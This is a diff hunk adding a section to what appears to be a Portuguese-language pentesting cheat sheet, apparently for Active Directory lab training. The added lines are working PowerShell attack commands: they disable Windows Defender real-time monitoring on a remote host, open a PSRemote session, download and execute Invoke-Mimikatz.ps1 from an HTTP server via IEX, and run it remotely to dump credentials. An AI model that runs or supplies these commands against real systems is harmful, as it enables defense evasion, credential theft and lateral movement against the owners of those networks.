@@ -2721,3 +2721,21 @@ $ByteArray = [System.IO.File]::ReadAllBytes($Filename);
 $Base64String = [System.Convert]::ToBase64String($ByteArray);
 Set-Content blood1.txt -Value $Base64String
 ```
+##### POWERSHELL - CARREGAR O MIMIKATZ REMOTTAMENTE VIA PSREMOTE 
+DESABILITAR O DEFENDER REMOTAMENTE:
+```
+Invoke-Command -Scriptblock{Set-MpPreference -DisableRealtimeMonitoring $true -Verbose} -computername dcorp-mgmt
+Invoke-Command -Scriptblock{Get-MpPreference| findstr /I realtime} -computername dcorp-mgmt
+```
+CRIAR UMA SESSÃO DE PSREMOTE EM UMA VARIAVEL:
+```
+$sess = New-Pssession -computername dcorp-mgmt
+$sess
+```
+CARREGAR O MIMIKATZ LOCALMENTE E DEPOIS REMOTAMENTE:
+```
+IEX(New-Object System.Net.WebClient).DownloadString("http://172.16.99.209/oscp/crtp/Invoke-Mimikatz.ps1")
+Invoke-Command -Scriptblock ${function:Invoke-Mimikatz} -session $sess
+```
+
+
